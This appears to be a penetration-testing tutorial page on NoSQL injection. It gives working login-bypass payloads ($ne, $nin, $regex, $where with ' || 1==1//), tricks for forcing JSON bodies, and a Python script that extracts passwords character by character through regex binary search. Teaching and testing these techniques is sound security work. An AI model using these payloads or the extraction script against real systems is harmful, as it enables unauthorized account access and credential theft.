---
description: >-
  NoSQL databases are a type of database, where often objects are used instead
  of SQL strings
---

# NoSQL Injection

While SQL Injection in the traditional sense is not possible, there are still some new opportunities for vulnerabilities that NoSQL introduces. Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.&#x20;

Often the goal is to bypass some login screen, by returning an always-true request. Sometimes you want to get more specific records or try to extract data.&#x20;

## JSON Injection

Pretty often, especially in JavaScript backends, the server accepts JSON as data for API requests. The backend expects a certain simple format, like:

```json
{
  "username": "user",
  "password": "pass",
}
```

But in reality, an attacker can make the values of `username` or `password` any JSON object. This may have interesting results, and for NoSQL, you can create an object like the following:

```json
{
  "username": "admin",
  "password": {
    "$ne": "wrong"
  }
}
```

This creates a query that asks if the password is **not equal** to "wrong", with `$ne`. If there is then a user named "admin" with a different password, it will let you through and return the record of the "admin" user, bypassing the Login screen.&#x20;

### Forcing JSON

Most websites don't use JSON by default for requests, but some may still accept JSON data if you give it some. To change the content type of your POST data, you can add a `Content-Type` header:

```http
Content-Type: application/json
```

Then simply put JSON instead of URL parameters in your body, to see if the server still accepts the request with data in that format. If this works, you can try some NoSQL Injection as seen above.&#x20;

{% code title="Before (URL parameters)" %}
```php
username=user&password=pass
```
{% endcode %}

{% code title="After (JSON)" %}
```json
{
  "username": "user",
  "password": "pass"
}
```
{% endcode %}

To quickly do this in a proxy like Burp Suite, you can install this extension to easily convert your POST data into JSON, and add the correct header as well:

{% embed url="https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278" %}
Burp Suite extension to convert the content type of a request
{% endembed %}

## Injection in URL

While this JSON conversion sometimes works, it is not always accepted by the server. However, in **PHP** and possibly other frameworks there is another way to create arbitrary objects and inject NoSQL syntax:

```php
username=admin&password[$ne]=wrong
```

This example will create the following array in PHP, and might trip up NoSQL queries:

```php
array(2) {
  ["username"]=> string(4) "admin"
  ["password"]=> array(1) {
    ["$ne"]=> string(4) "wrong"
  }
}
```

## Extracting data

### Get other data

Often in a NoSQL injection, you are returning an always-true response to get through a login screen. This will return the first true record, which is likely always the first user created. But sometimes you want to log in as the second user, or any other user.&#x20;

To return specifically that user, you can provide a unique thing about that user if you know it, like a username, while keeping the password always true.&#x20;

If you don't know anything about other users, you can also simply exclude any user you don't want with the `$nin` keyword, and an array:

{% code title="URL parameters" %}
```php
username[$nin][]=admin&username[$nin][]=other&password[$ne]=wrong
```
{% endcode %}

{% code title="JSON" %}
```json
{
  "username": {
    "$nin": ["admin", "other"]
  },
  "password": {
    "$ne": "wrong"
  }
}
```
{% endcode %}

### RegEx Boolean Brute-Force

Logging in does not regularly respond with the password for example that we made always true. This results in us being logged in, but not knowing the actual password, while it might still be useful to know this.&#x20;

A login action typically is a boolean response, resulting in a successful login, or an unsuccessful one. With the powerful NoSQL operators, we can abuse this feedback to slowly extract values from the query character by character, using `$regex`. The RegEx pattern will match if there is a password with that pattern, and fail if there is not.

This can be optimized by using [Binary Search](https://en.wikipedia.org/wiki/Binary\_search\_algorithm), an algorithm that allows you to cut in half the search space every time you ask a yes/no question. This makes finding any character in ASCII take only $$log_2(127) \approx 7$$ requests. See the following script for an example:

```python
# A function that returns True if the regex passes
def test_password(regex):
    data = {
        "username": "admin",
        "password": {
            "$regex": regex
        }
    }

    r = requests.post(URL, json=data, allow_redirects=False)

    return not 'Login Failed' in r.text

# Binary Search algorithm
def search_once(test_function, prefix=""):
    min = 0
    max = 127

    while min <= max:
        mid = (min + max) // 2

        if test_function(fr'^{re.escape(prefix)}[\x{mid:02x}-\x7f]'):
            min = mid + 1
        else:
            max = mid - 1

    return chr(max)

# Keep searching until whole string found
def search(test_function):
    found = ""
    while True:
        found += search_once(test_function, prefix=found)
        print(found)

        if test_function(fr'^{found}$'):
            return found

password = search(test_password)
print(password)
```

## Filter Bypass

In most examples above, I used the `$ne` operator. But there are lots more ways to achieve an always-true result. For example:

```json
"$regex": ".*"  // Regular Expression
"$exists": true  // If any record exists
"$gt": "A"  // Greater than
"$lt": "z"  // Less than
```

## $where

MongoDB is a popular NoSQL framework, but sometimes still allows for a string injection like regular SQL Injection. Sometimes your input will end up in a `$where` clause with a condition similar to the following:

```javascript
`return (this.username == '${username}' && this.password == '${password}')`
```

In the same way as SQL Injection, you can make this condition always true by injecting one of the following in the `username` field:

```javascript
' || 1==1//
' || 1==1%00
```

Another simple way to make one statement true without many special characters:

```javascript
'=='
```

For more payloads for the same idea see [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads).

{% hint style="info" %}
**Note**: While it seems we are injecting into server-side JavaScript code, this language from MongoDB is very restricted and in modern versions does **not** have much use for attackers. However, in **very old** versions it might be possible to get [Remote Code Execution](https://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/) from this.&#x20;
{% endhint %}
